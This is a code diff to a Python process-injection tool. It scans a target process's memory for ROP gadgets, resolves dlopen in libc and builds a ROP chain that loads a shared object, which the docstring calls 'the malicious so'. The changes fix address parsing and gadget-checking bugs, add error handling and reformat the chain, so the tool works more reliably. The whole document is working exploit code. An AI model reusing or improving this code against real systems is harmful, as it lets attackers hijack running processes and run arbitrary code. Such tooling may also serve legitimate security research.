@@ -101,18 +101,25 @@ def find_gadget(pid: int, maps_entry: dict, gadget: bytes) -> int:
     :param pid: id of the target process
     :param maps_entry: dict representing a parsed memory mapping
     :param gadget: signature (assembled instructions) of the gadget
-    :return: the desired gadget's address in mapped executable memory
+    :return: the desired gadget's address in mapped executable memory, or -1 if not found
     """
     map_size = get_entry_size(maps_entry)
-    start = int("0x" + maps_entry["start"], 16)
-    mapped_memory = read_memory(pid, start, map_size)
+    start = int(maps_entry["start"], 16)  # Convert start address to integer
+
+    try:
+        mapped_memory = read_memory(pid, start, map_size)
+    except Exception as e:
+        print(f"[-] error reading memory: {e}")
+        return -1
+
     offset = mapped_memory.find(gadget)
     if offset != -1:
-        result = offset + start
+        gadget_addr = offset + start
+        log.info(f"found gadget at: {hex(gadget_addr)}")
+        return gadget_addr
     else:
-        result = offset
-    log.info(f"found gadget: {gadget} at {hex(result)}")
-    return result
+        print(f"[-] gadget not found in memory region starting at: {hex(start)}")
+        return -1
 
 
 def locate_dlopen(pid: int, libc_base: int) -> int:
@@ -128,11 +135,11 @@ def locate_dlopen(pid: int, libc_base: int) -> int:
     base = None
     for entry in maps['bin']:
         if 'libc.so.6' in entry["name"]:
-            base = entry["start"]
+            base = int(entry["start"], 16)  # Convert base address to integer
             break
     if base is None:
         raise Exception("could not find libc base address in target process")
-    offset = address - int(base, 16)
+    offset = address - base
     final_addr = libc_base + offset
     log.info(f"libc base: {hex(final_addr)}")
     return final_addr
@@ -144,30 +151,43 @@ def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
     :param address: target address
     :param so_path: the path to the malicious so
     :param maps: a parsed proc maps dict
-    :return: void
+    :return: the ROP chain
     """
 
     for gadget in GADGET_LIST.keys():
         log.info(f"finding: {gadget}")
         for binary in maps["bin"]:
             gadget_addr = find_gadget(pid=pid, maps_entry=binary, gadget=GADGET_LIST[gadget])
-            if address != -1:
+            if gadget_addr != -1:  # Ensure valid gadget address
                 if gadget == "return_addr":
                     address = address + 2
-                log.success("found! => " + str(hex(address)))
+                log.success("found! => " + str(hex(gadget_addr)))
                 GADGET_LIST[gadget] = gadget_addr.to_bytes(8, byteorder="little")
                 break
+            else:
+                print(f"[-] invalid gadget address for {gadget}, skipping...")
+                continue
 
+    # Find dlopen in libc
     for binary in maps["bin"]:
         if 'libc.so.6' in binary["name"]:
-            dlopen_addr = locate_dlopen(pid=pid, libc_base=binary["start"])
+            libc_base = int(binary["start"], 16)  # Convert libc base address to integer
+            dlopen_addr = locate_dlopen(pid=pid, libc_base=libc_base)  # Pass integer libc_base
             break
     else:
         print("[-] didn't find dlopen's address...")
         exit(1)
 
-    rop_chain = GADGET_LIST["pop_rsi"] + p64(dlopen_addr) + GADGET_LIST["mov_rax_rsi"] + GADGET_LIST["pop_rsi"] + (
-        2).to_bytes(8, byteorder="little") + GADGET_LIST["pop_rdi"] + so_path.encode() + GADGET_LIST["jmp_rax"]
+    rop_chain = (
+        GADGET_LIST["pop_rsi"] +
+        p64(dlopen_addr) +
+        GADGET_LIST["mov_rax_rsi"] +
+        GADGET_LIST["pop_rsi"] +
+        (2).to_bytes(8, byteorder="little") +
+        GADGET_LIST["pop_rdi"] +
+        so_path.encode() +
+        GADGET_LIST["jmp_rax"]
+    )
 
     return rop_chain
 
